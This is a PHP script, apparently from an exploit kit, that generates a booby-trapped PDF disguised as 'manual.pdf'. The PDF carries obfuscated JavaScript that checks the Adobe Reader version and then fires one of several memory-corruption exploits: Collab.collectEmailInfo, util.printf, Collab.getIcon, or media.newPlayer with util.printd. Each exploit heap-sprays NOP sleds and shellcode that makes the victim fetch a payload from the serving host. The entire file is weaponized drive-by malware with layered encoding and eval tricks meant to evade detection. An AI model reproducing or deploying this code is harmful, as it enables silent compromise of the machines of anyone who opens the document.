<?php 
if( !isset($_GET["f"]) ) 
{
    exit();
}

include("../config.php");
include("../" . Config::get("LibDir", "lib") . "/js.php");
include("../" . Config::get("LibDir", "lib") . "/sc.php");
$fname = $_SERVER["PHP_SELF"];
$fname = str_replace(basename(__FILE__), Config::get("DownloadFileName") . ".php", $fname);
$fname = str_replace(Config::get("ExploitsDir") . "/", "", $fname);
$sc = _obfuscated_0D0E072D0A2C1E25182F3C352F0C31040F1B1D343F3D11_("http://" . $_SERVER["SERVER_NAME"] . $fname . "?f=" . intval($_GET["f"]) . "&e=3");
$sc = _obfuscated_0D0E2A39072632110A3D251539011114032210091A2932_($sc);
$pdf_script = "" . "var bjsg='" . $sc . "';function ezvr(ra,qy){while(ra.length*2<qy){ra+=ra;}\r\nra=ra.substring(0,qy/2);return ra;} \r\nfunction bx(){var dkg=new Array();var vw=0x0c0c0c0c;var addr=0x400000;var payload=unescape(bjsg);var sc_len=payload.length*2;var qy=addr-(sc_len+0x38);var yarsp=unescape(\"%u9090%u9090\");yarsp=ezvr(yarsp,qy);var count2=(vw-0x400000)/addr;for(var count=0;count<count2;count++){dkg[count]=yarsp+payload;} \r\nvar overflow=unescape(\"%u0c0c%u0c0c\");while(overflow.length<44952){overflow+=overflow;} \r\nthis.collabStore=Collab.collectEmailInfo({subj:\"\",msg:overflow});} \r\nfunction printf(){nop=unescape(\"%u0A0A%u0A0A%u0A0A%u0A0A\");var payload=unescape(bjsg);heapblock=nop+payload;bigblock=unescape(\"%u0A0A%u0A0A\");headersize=20;spray=headersize+heapblock.length;while(bigblock.length<spray){bigblock+=bigblock;} \r\nfillblock=bigblock.substring(0,spray);block=bigblock.substring(0,bigblock.length-spray);while(block.length+spray<0x40000){block=block+block+fillblock;} \r\nmem=new Array();for(i=0;i<1400;i++){mem[i]=block+heapblock;} \r\nvar num=12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;util.printf(\"%45000f\",num);} \r\nfunction geticon(){var arry=new Array();if(app.doc.Collab.getIcon){var payload=unescape(bjsg);var hWq500CN=payload.length*2;var qy=0x400000-(hWq500CN+0x38);var yarsp=unescape(\"%u9090%u9090\");yarsp=ezvr(yarsp,qy);var p5AjK65f=(0x0c0c0c0c-0x400000)/0x400000;for(var vqcQD96y=0;vqcQD96y<p5AjK65f;vqcQD96y++){arry[vqcQD96y]=yarsp+payload;} \r\nvar tUMhNbGw=unescape(\"%09\");while(tUMhNbGw.length<0x4000){tUMhNbGw+=tUMhNbGw;} \r\ntUMhNbGw=\"N.\"+tUMhNbGw;app.doc.Collab.getIcon(tUMhNbGw);}} \r\naPlugins=app.plugIns;var sv=parseInt(app.viewerVersion.toString().charAt(0));for(var i=0;i<aPlugins.length;i++){if(aPlugins[i].name=='EScript'){var lv=aPlugins[i].version;}} \r\nif((lv==9)||((sv==8)&&(lv<=8.12))){geticon();}else if(lv==7.1){printf();}else if(((sv==6)||(sv==7))&&(lv<7.11)){bx();}else if((lv>=9.1)||(lv<=9.2)||(lv>=8.13)||(lv<=8.17)){function a(){util.printd('p@111111111111111111111111 : yyyy111',new Date());}\r\nvar h=app.plugIns;for(var f=0;f<h.length;f++){if(h[f].name=='EScript'){var i=h[f].version;}} \r\nif((i>8.12)&&(i<8.2)){c=new Array();var d=unescape('%u9090%u9090');var e=unescape(bjsg);while(d.length<=0x8000){d+=d;}\r\nd=d.substr(0,0x8000-e.length);for(f=0;f<2900;f++){c[f]=d+e;}\r\na();a();try{this.media.newPlayer(null);}catch(e){}\r\na();}}";
$string = str_split($pdf_script);
$i = 0;
for( $content = ""; $i < count($string); $i++ ) 
{
    $content .= ord($string[$i]) / 2 . "*wq";
}
$pdf_script = substr($content, 0, 0 - 1);
$pdf_script2 = JS::randomezevar("\r\nvar <*n2>='';\r\n<*date> = new Date(2010,11,3,2);\r\nvar <*e> = function(){return {e:eval}}().e;\r\n<*s> = 'thi'+<*date>.getHours()+'ducer';\r\n<*pr>=<*e>(<*s>.replace(2,'s.pro'));\r\nar = <*pr>.split('q');\r\nvar s = '';\r\nw = <*date>.getHours();\r\nvar <*qq> = 'fro'+<*date>.getHours()+'arCode';\r\n<*qq>=<*qq>.replace(2,'mCh');\r\n<*ss>=String[<*qq>];\r\nfor (i = 0; i < ar.length; i++) {\r\n\t<*q> = <*e>(ar[i]);\r\n\ts += <*ss>(<*q>);\r\n}\r\n<*e>(s);\r\n");
$pdf_script2 = str_replace("(", "\\(", $pdf_script2);
$pdf_script2 = str_replace(")", "\\)", $pdf_script2);
$pdf_template = "" . "%PDF-1.3\r\n2 0 obj\r\n<<\r\n>>\r\nendobj\r\n3 0 obj\r\n<<\r\n/Producer (" . $pdf_script . ")\r\n/CreationDate (D:2011725103251)\r\n>>\r\nendobj\r\n1 0 obj\r\n<<\r\n/Pages 2 0 R\r\n/Names <</JavaScript <</Names [() <</S /JavaScript\r\n/JS (" . $pdf_script2 . ")\r\n>>]\r\n>>\r\n>>\r\n>>\r\nendobj\r\nxref\r\ntrailer\r\n<<\r\n/Root 1 0 R\r\n/Info 3 0 R\r\n>>\r\nstartxref\r\n698\r\n%%EOF";
header("Accept-Ranges: bytes\r\n");
header("Content-Length: " . strlen($pdf_template) . "\r\n");
header("Content-Disposition: inline; filename=manual.pdf");
header("\r\n");
header("Content-Type: application/pdf\r\n\r\n");
echo $pdf_template;

